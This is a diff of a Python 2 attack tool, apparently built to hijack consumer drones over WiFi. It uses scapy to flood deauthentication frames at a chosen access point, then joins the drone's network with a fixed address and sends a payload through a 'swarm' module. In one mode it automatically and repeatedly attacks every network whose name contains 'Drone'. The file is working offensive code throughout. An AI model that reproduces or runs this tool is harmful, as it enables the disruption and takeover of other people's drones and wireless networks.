@@ -1,151 +1,145 @@
 #!/usr/bin/env python2
+# -*- coding: utf-8 -*-
 from scapy.all import * 
 import re
 import os 
 import sys
 import threading 
-import wireless 
+from pythonwifi.iwlibs import Wireless, getNICnames
 import time 
 import swarm
 
+
+ATTACK_NIC = 'wlan3'
+AUTO_TARGET = 'Drone'
+
+
 class Deauth(threading.Thread):
-    def __init__(self,mac=None):
+    def __init__(self, mac=None, w_nic='wlan3'):
         threading.Thread.__init__(self)
         self.mac=mac
+        self.iface=w_nic
         self.pkt=scapy.all.RadioTap()/scapy.all.Dot11(addr1="ff:ff:ff:ff:ff:ff",addr2=mac,addr3=mac)/scapy.all.Dot11Deauth()
 
     def run(self):
-        for item in range(0,20):
-            scapy.all.sendp(self.pkt, iface="mon0",count=1, inter=.2, verbose=0)
-        print "Attack complete"
+        for item in range(0,2):
+            scapy.all.sendp(self.pkt, iface=self.iface, count=10, inter=.2, verbose=0)
+        print "De-Auth Attack complete"
 
-auto_target = 'Drone'
-armed = 0
-pkt_count = 60
-pkt_all = 0
-ap_list = []
-interfaces = []
 
 def get_interface():
-   aa = wireless.Wireless() 
-   return aa.interfaces() 
+   return getNICnames()
 
 
-def hijack_drone(target,wint):
-   print('Hijacking {0}'.format(target))
-   os.system('iwconfig {0} essid {1}'.format(wint,target))
-   time.sleep(1)
-   os.system('dhclient {0}'.format(wint))
-   
-   
+def hijack_drone(target_ssid, interface):
+   print('Hijacking {} using {}'.format(target_ssid, interface))
+   os.system('ifconfig {} down'.format(interface))
+   wifi = Wireless(interface)
+   wifi.setEssid(target_ssid)
+   os.system('ifconfig {} 192.168.1.76 netmask 255.255.255.0'.format(interface))
+   os.system('ifconfig {} up'.format(interface))
+   os.system('route add -net 192.168.1.0 netmask 255.255.255.0')
+   print('Hijack Networking complete')
 
-def monitor_manage(cmd):
-   ints = get_interface() 
-   for item in ints:
-      if 'wlan' in item:
-         wint = item
-      if 'mon' in item and cmd == 'start':
-         print("Monitor mode already enabled. Exiting")
-         return
+
+def monitor_manage(cmd, iface_name):
+   os.system('ifconfig {} down'.format(iface_name))
+   wifi_card = Wireless(iface_name)
    if cmd == 'start':
-      print('Initializing monitor mode [airmon method]')
-      os.system('airmon-ng start {0}'.format(wint))
+      print('Initializing monitor mode')
+      wifi_card.setMode('monitor')
    elif cmd == 'stop':
-      print('Stopping monitor mode [airmon method]')
-      os.system('airmon-ng stop {0}'.format(wint))
+      wifi_card.setMode('managed')
    else:
-      print('Unknown command or bad interface') 
+      print('Unknown command. Use start or stop')
+   os.system('ifconfig {} up'.format(iface_name))
 
 
-def packet_process(pkt):
-   global ap_list
-   global pkt_all
-   if pkt.haslayer(Dot11):
-         if pkt.type == 0 and pkt.subtype == 8:
-            if (pkt.addr2,pkt.info) not in ap_list:
-               ap_list.append((pkt.addr2,pkt.info))
-               pkt_all += 1
-               print('{0}'.format(pkt_all))
-
-def stop_scan(x):
-   global ap_list
-   global target
-   global armed 
-   global pkt_all
-   global pkt_count
-   if pkt_all >= pkt_count:
-      return True
-   else:
-      return False 
-
-def load_mon(interfaces):
-   mon_interface = '' 
-   for line in interfaces:
-         if 'mon' in line:
-            mon_interface = line
-            return mon_interface
+def get_targets(w_nic):
+   wifi = Wireless(w_nic)
+   ap_list = wifi.scan()
+   ap_targets = []
+   for ap in wifi.scan():
+      ap_targets.append(ap.essid[4:].strip().replace('\x00',''))
+      # This is becase we are running on a 64bit OS. A little hacky, but it works.
+   return ap_targets   
 
 
-def seek_target():
-   global armed 
-   global interfaces
-   mons = load_mon(interfaces)
-   print(mons)
-   i = 1 
-   scapy.all.sniff(iface="mon0", prn=packet_process, stop_filter=stop_scan)
-   if armed == 0:
-      print('[+]Available targets')
-      for item in ap_list:
-         print('{0}: MAC: {1} SSID: {2}'.format(i,item[0],item[1]))
-         i += 1
-      print()
-      i = input("Enter target: ")
-      return int(i)
-   else:
-      return 0      
+def select_target(target_list):
+   i = 0
+   print('[+]Available targets')
+   for item in target_list:
+      print('{}: SSID: {}'.format(i,item))
+      i += 1
+   i = int(raw_input("Enter target: "))
+   return target_list[i]
 
+
+def get_ap_bssid(w_nic, essid):
+   # Not needed if python-wifi gets fixed
+   wifi = Wireless(w_nic)
+   wifi.setEssid(essid)
+   while wifi.getAPaddr() == '00:00:00:00:00:00)':
+      time.sleep(1)
+   return wifi.getAPaddr()
+
+
+def perform_attack(attack_nic, ap_mac, target, payload):
+   monitor_manage('start', attack_nic)
+   d = Deauth(ap_mac, attack_nic)
+   d.start()
+   print("waiting for deauth to complete")
+   d.join()
+   print('stopping monitor mode')
+   monitor_manage('stop', attack_nic)
+   print('monitor mode stopped')
+   hijack_drone(target, attack_nic)
+   time.sleep(3)
+   print('Sending Drone payload')
+   swarm.attack_drone(payload)
 
 
 def gunner_mode():
-   print('Starting target scanning...Ctrl+C to end early')
-   monitor_manage('start')
+   print('Starting target scanning')
    interfaces = get_interface()
-   wl = '' 
-   for item in interfaces:
-      if 'wlan' in item:
-         wl = item
-         break
-   targ_id = seek_target()
-   Deauth(ap_list[targ_id - 1][0]).start()
-   a = raw_input("Deauthing...hit enter when deauth tips you off")
-   monitor_manage('stop')
-   hijack_drone(ap_list[targ_id - 1][1],wl)
-   swarm.demon_drone() 
-
-def murica_mode():
-   global armed
-   armed = 1
-   monitor_manage('start')
-   interfaces = get_interface()
+   #print('Availible interfaces are {}'.format(interfaces))
    wl = ''
    for item in interfaces:
       if 'wlan' in item:
          wl = item
          break
-   seek_target()
-   for item in ap_list:
-      if auto_target in item[1]:
-         Deauth(item[0]).start()
-         time.sleep(7)
-         monitor_manage('stop')
-         hijack_drone(item[1],wl)
-         swarm.demon_drone()
-   os.system("killall dhclient")     
-   
+   run = True
+   scan = True
+   while run is True:
+      if scan is True:
+         targets = get_targets(wl)
+      target = select_target(targets)
+      ap_mac = get_ap_bssid(wl, target)
+      perform_attack(wl, ap_mac, target,'demon')
+      scan = False
+      selection = raw_input('Do you want to fire again? Y/n/rescan: ')
+      if selection == 'rescan':
+         scan = True
+      elif selection == 'n':
+         run = False
+
+
+def murica_mode():
+   while True:
+      targets = get_targets(ATTACK_NIC)
+      for target in targets:
+         if AUTO_TARGET not in target:
+            continue
+         ap_mac = get_ap_bssid(ATTACK_NIC, target)
+         perform_attack(ATTACK_NIC, ap_mac, target, 'nice')
+      print('Attack loop complete, waiting 10 seconds')
+      time.sleep(10)
 
 if len(sys.argv) < 2:
    print("{0} gunner|murica".format(sys.argv[0]))
    sys.exit(0)
+os.system('service network-manager stop')
+os.system('ifconfig {} up'.format(ATTACK_NIC))
 sys.argv[1] == 'gunner' and gunner_mode()
 sys.argv[1] == 'murica' and murica_mode() 
 
